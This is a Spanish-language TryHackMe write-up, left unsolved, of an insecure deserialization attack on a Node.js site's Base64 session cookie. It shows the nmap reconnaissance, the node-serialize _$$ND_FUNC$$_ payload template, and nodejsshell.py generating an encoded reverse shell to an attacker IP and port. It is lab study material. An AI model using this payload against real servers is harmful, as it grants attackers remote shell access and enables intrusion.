---
title: "Jax sucks alot............."
date: 2024-12-08
category: "TryHackMe"
order: 2
tags: ["tryhackme", "nodejs", "deserialization", "unsolved"]
layout: layouts/writeup.njk
permalink: /writeups/thm-jax-sucks-alot.html
---

> Nota: este write-up quedó sin resolver. Lo dejo tal cual está en mis notas originales, incluyendo el intento fallido, porque el proceso de troubleshooting también enseña algo.

## Reconocimiento

```bash
root@ip-10-10-201-20:~# sudo nmap -Pn -n -v -p- --min-parallelism 64 --min-rate 20000 --min-hostgroup 64 --randomize-hosts -sS -sV 10.10.40.52
Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-01 04:56 GMT
Completed SYN Stealth Scan at 04:57, 97.11s elapsed (65535 total ports)
Nmap scan report for 10.10.40.52
Host is up (0.00087s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http
```

El servicio en el puerto 80 no fue reconocido automáticamente por nmap, pero el fingerprint HTTP reveló un título de página: **"Horror LLC"**.

## Análisis del sitio web

Analizando el sitio, se puede ver que toma la entrada del usuario y la asigna a la cookie de sesión. Copiando el valor de la cookie y decodificándolo con CyberChef (también se puede usar el decoder de Burp Suite si se sabe el formato), se confirma que está en **Base64** y contiene un objeto **JSON**.

## La vulnerabilidad: deserialización insegura en Node.js

Investigando, se determina que es una vulnerabilidad de **deserialización en Node.js**. La referencia usada para entender el ataque es [este blog de OpSecX](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/), junto con la herramienta [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) que genera el payload automáticamente.

La base del payload usa la sintaxis de deserialización insegura de la librería `node-serialize`:

```json
{"rce":"_$$ND_FUNC$$_function (){ 'nodejsshell_code' }()"}
```

### Generar el payload

```bash
root@ip-10-10-144-29:~# python nodejsshell.py 10.13.51.230 4444
[+] LHOST = 10.13.51.230
[+] LPORT = 4444
[+] Encoding
eval(String.fromCharCode(...))
```

El script genera un `eval(String.fromCharCode(...))` que reconstruye un reverse shell en JavaScript byte por byte, evitando caracteres problemáticos en el JSON.

### Insertar el payload en el campo vulnerable

Se probó tanto en el campo `rce` como en el campo `email`:

```json
{"rce":"_$$ND_FUNC$$_function (){ 'eval(String.fromCharCode(...))' }()"}
```

```json
{"email":"_$$ND_FUNC$$_function (){ 'eval(String.fromCharCode(...))' }()"}
```

Ambos se codificaron en Base64 con Burp Suite para reemplazar el valor de la cookie de sesión.

## Por qué debería funcionar (en teoría)

El flujo esperado del ataque es:

1. El servidor deserializa la cookie de sesión con `node-serialize` (o similar).
2. Si el JSON contiene una función con el prefijo `_$$ND_FUNC$$_`, la librería la **ejecuta como código** en lugar de tratarla como dato.
3. El código inyectado abre una conexión TCP hacia la IP y puerto del atacante y ejecuta `/bin/sh`, entregando una reverse shell.
4. Con la shell, el siguiente paso sería escalar privilegios en la máquina.

## Resultado: no funcionó

> ahhhg, no me funciono, si estoy haciendo todos los pasos bien, literal solo es de cambiar el valor de la cookie en el navegador, recargar y se obtiene la reverse shell y luego ya solo escalar privilegios, super easy, pero ya probé localmente y con la attackbox de THM y nadita.

Se probaron múltiples variantes del payload (con el campo `rce`, con el campo `email`, distintas IPs de listener) sin éxito, tanto en un entorno local como en la AttackBox de TryHackMe. No se identificó la causa raíz del fallo — quedan pendientes de revisar: si la librería `node-serialize` de la versión objetivo requiere una sintaxis distinta, si hay un firewall bloqueando la conexión saliente del reverse shell, o si el campo vulnerable era otro distinto a los probados.
